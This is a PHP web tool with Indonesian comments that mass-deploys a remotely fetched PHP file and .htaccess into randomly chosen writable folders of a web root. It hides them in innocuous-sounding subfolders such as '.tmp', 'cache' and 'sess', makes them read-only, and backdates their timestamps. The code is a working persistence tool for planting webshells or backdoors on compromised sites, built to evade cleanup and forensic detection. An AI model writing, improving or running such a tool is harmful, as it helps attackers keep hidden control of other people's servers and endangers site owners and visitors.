<?php
// Pengaturan error reporting dan optimasi
ini_set('display_errors', 1);
error_reporting(E_ALL);
ini_set('memory_limit', '256M'); // Alokasi memori tambahan
ob_implicit_flush(true); // Aktifkan real-time output

define('SCRIPT_VERSION', '2025-09-22-v5-optimized');

// Fungsi untuk mengambil file dari URL (tidak berubah)
function fetchFileFromUrl($url) {
    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) return false;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT      => 'Mozilla/5.0',
        CURLOPT_TIMEOUT        => 10,
    ]);
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($http_code === 200 && strlen(trim($data)) > 0) ? $data : false;
}

// Fungsi untuk generate nama folder acak (tidak berubah)
function generateRandomFolderName($base, $used = []) {
    $names = ['.tmp', 'cache', 'function', 'logs', 'sess', 'lib', 'assets', 'data'];
    shuffle($names);
    foreach ($names as $name) {
        $folder = $base . '/' . $name;
        if (!in_array($folder, $used) && !is_dir($folder)) {
            return $folder;
        }
    }
    return $base . '/folder_' . substr(md5(uniqid()), 0, 6);
}

// Fungsi untuk mencari semua folder yang bisa ditulisi secara efisien
function findAllWritableFolders($dir) {
    $writableFolders = [];
    try {
        // Gunakan iterator untuk efisiensi memori, bukan scandir rekursif
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($iterator as $fileInfo) {
            if ($fileInfo->isDir() && $fileInfo->isWritable()) {
                $writableFolders[] = $fileInfo->getPathname();
            }
        }
    } catch (Exception $e) {
        echo "<div class='error'>❌ Gagal memindai direktori: " . htmlspecialchars($e->getMessage()) . "</div>";
    }
    return $writableFolders;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>🚀 Mass Deploy ke Leaf Folder (Optimized)</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
        input, button { padding: 10px; width: 100%; margin-bottom: 10px; background: #222; border: 1px solid #333; color: #0f0; border-radius: 4px; }
        button { background: #0f0; color: #000; font-weight: bold; cursor: pointer; }
        button:disabled { background: #444; color: #888; cursor: not-allowed; }
        .log { background: #0a0a0a; border: 1px solid #333; padding: 15px; margin-top: 20px; border-radius: 5px; min-height: 100px; font-size: 0.9em; line-height: 1.6; }
        .success { color: #0f0; }
        .error { color: #f33; }
        .info { color: #0af; font-weight: bold; }
        label { margin-bottom: 5px; display: block; }
    </style>
</head>
<body>
    <h2>🚀 Mass Deploy .php + .htaccess ke Leaf Folder</h2>
    
    <?php if ($_SERVER['REQUEST_METHOD'] !== 'POST'): ?>
    <form method="POST" onsubmit="document.getElementById('submitBtn').disabled = true; document.getElementById('submitBtn').innerText = '🚀 Memproses...';">
        <label for="target_path">📁 Target Path:</label>
        <input type="text" id="target_path" name="target_path" required placeholder="/home/user/public_html">

        <label for="htaccess_url">🌐 URL .htaccess:</label>
        <input type="text" id="htaccess_url" name="htaccess_url" required placeholder="https://raw.githubusercontent.com/.../.htaccess">

        <label for="php_url">🌐 URL PHP File:</label>
        <input type="text" id="php_url" name="php_url" required placeholder="https://raw.githubusercontent.com/.../file.php">

        <label for="php_name">📄 Nama File PHP:</label>
        <input type="text" id="php_name" name="php_name" value="index.php">

        <label for="folder_limit">🔢 Jumlah Folder Random (1-50):</label>
        <input type="number" id="folder_limit" name="folder_limit" min="1" max="50" value="5">

        <label for="timestamp">⏱️ Timestamp (YYYY-MM-DD HH:MM:SS):</label>
        <input type="text" id="timestamp" name="timestamp" placeholder="Contoh: 2025-09-22 04:30:00 (opsional)">

        <button type="submit" id="submitBtn">🚀 Deploy Sekarang</button>
    </form>
    <?php endif; ?>

    <div class="log">
    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        echo "<h3>Memulai Proses Deployment...</h3>";

        // Ambil dan validasi input
        $target = rtrim($_POST['target_path'] ?? '', '/');
        $phpUrl = $_POST['php_url'] ?? '';
        $htaccessUrl = $_POST['htaccess_url'] ?? '';
        $phpName = basename($_POST['php_name'] ?? 'index.php');
        $limit = max(1, min(50, intval($_POST['folder_limit'] ?? 5)));
        $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : false;

        // Validasi awal
        if (!is_dir($target)) {
            echo "<div class='error'>❌ Folder target tidak valid: " . htmlspecialchars($target) . "</div>";
        } else {
            // Ambil konten file
            $phpContent = fetchFileFromUrl($phpUrl);
            $htaccessContent = fetchFileFromUrl($htaccessUrl);

            if (!$phpContent) echo "<div class='error'>❌ Gagal mengambil konten file PHP dari URL. Pastikan URL valid.</div>";
            if (!$htaccessContent) echo "<div class='error'>❌ Gagal mengambil konten .htaccess dari URL. Pastikan URL valid.</div>";

            // Lanjutkan jika semua konten berhasil diambil
            if ($phpContent && $htaccessContent) {
                echo "<div class='info'>🔎 Mencari folder yang bisa ditulisi...</div>";
                $allFolders = findAllWritableFolders($target);
                
                if (empty($allFolders)) {
                    echo "<div class='error'>❌ Tidak ditemukan folder yang bisa digunakan untuk deployment.</div>";
                } else {
                    echo "<div class='success'>📦 Ditemukan " . count($allFolders) . " folder yang bisa digunakan. Memilih " . $limit . " folder secara acak...</div>";
                    shuffle($allFolders);
                    $targets = array_slice($allFolders, 0, $limit);
                    $usedFolders = [];

                    foreach ($targets as $base) {
                        $newFolder = generateRandomFolderName($base, $usedFolders);
                        $usedFolders[] = $newFolder;

                        echo "<div class='info'>📂 Memproses target: " . htmlspecialchars($newFolder) . "</div>";

                        if (!is_dir($newFolder) && !@mkdir($newFolder, 0755, true)) {
                            echo "<div class='error'>❌ Gagal membuat folder: " . htmlspecialchars($newFolder) . "</div>";
                            continue;
                        }

                        $phpPath = $newFolder . '/' . $phpName;
                        $htPath  = $newFolder . '/.htaccess';

                        // Tulis dan amankan file PHP
                        if (@file_put_contents($phpPath, $phpContent) !== false) {
                            @chmod($phpPath, 0444);
                            if ($timestamp) @touch($phpPath, $timestamp);
                            echo "<div class='success'>✅ File PHP dideploy & dikunci (0444): " . htmlspecialchars($phpPath) . "</div>";
                        } else {
                            echo "<div class='error'>❌ Gagal menulis file PHP ke: " . htmlspecialchars($phpPath) . "</div>";
                        }

                        // Tulis dan amankan .htaccess
                        if (@file_put_contents($htPath, $htaccessContent) !== false) {
                            @chmod($htPath, 0444);
                             if ($timestamp) @touch($htPath, $timestamp);
                            echo "<div class='success'>✅ File .htaccess dideploy & dikunci (0444): " . htmlspecialchars($htPath) . "</div>";
                        } else {
                            echo "<div class='error'>❌ Gagal menulis .htaccess ke: " . htmlspecialchars($htPath) . "</div>";
                        }

                        // Kunci folder parent untuk keamanan tambahan (opsional, bisa menyebabkan masalah akses)
                        if (@chmod($newFolder, 0555)) {
                             if ($timestamp) @touch($newFolder, $timestamp);
                             echo "<div class='success'>🔒 Folder diamankan (0555): " . htmlspecialchars($newFolder) . "</div>";
                        } else {
                             echo "<div class='error'>⚠️ Gagal mengamankan folder " . htmlspecialchars($newFolder) . "</div>";
                        }
                    }
                    echo "<h3 style='color:#0f0;'>✅ Semua Proses Selesai.</h3>";
                }
            }
        }
    }
    ?>
    </div>
    <p style="color:gray;font-size:0.9em; text-align: center; margin-top: 20px;">Versi: <?= SCRIPT_VERSION ?></p>
</body>
</html>
